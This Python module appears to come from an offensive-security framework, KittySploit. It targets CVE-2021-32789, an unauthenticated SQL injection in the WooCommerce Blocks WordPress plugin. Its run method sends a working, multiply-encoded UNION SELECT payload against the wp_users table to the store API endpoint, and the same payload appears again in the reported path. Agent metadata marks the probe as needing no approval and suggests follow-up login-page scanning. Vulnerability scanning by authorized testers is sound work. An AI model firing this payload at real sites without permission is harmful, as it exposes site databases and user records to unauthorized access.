#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""woocommerce-gutenberg-products-block is a feature plugin for WooCommerce Gutenberg Blocks."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WooCommerce Blocks 2.5 to 5.5 - Unauthenticated SQL Injection Detection',
        'description': 'woocommerce-gutenberg-products-block is a feature plugin for WooCommerce Gutenberg Blocks. An SQL injection vulnerability impacts all WooCommerce sites running the WooCommerce Blocks feature plugin between version 2.5.0 and prior to version 2.5.16. Via a carefully crafted URL, an exploit can be executed against the `wc/store/products/collection-data?calculate_attribute_counts[][taxonomy]` endpoint that allows the execution of a read only sql query. There are patches for many versions of this package, starting with version 2.5.16. There are no known workarounds aside from upgrading.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'woocommerce', 'sqli', 'wp-plugin', 'wp', 'wpscan', 'automattic', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://woocommerce.com/posts/critical-vulnerability-detected-july-2021',
            'https://viblo.asia/p/phan-tich-loi-unauthen-sql-injection-woocommerce-naQZRQyQKvx',
            'https://securitynews.sonicwall.com/xmlpost/wordpress-woocommerce-plugin-sql-injection/',
            'https://wpscan.com/vulnerability/0f2089dc-9376-4d7d-95a2-25c99526804a',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-32789',
        ],
        'cve': 'CVE-2021-32789',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('sqli-test', 'attribute_counts', 'price_range', 'term',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WooCommerce Blocks 2.5 to 5.5 - Unauthenticated SQL Injection detected",
                path='/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500',
            )
            return True
        return False

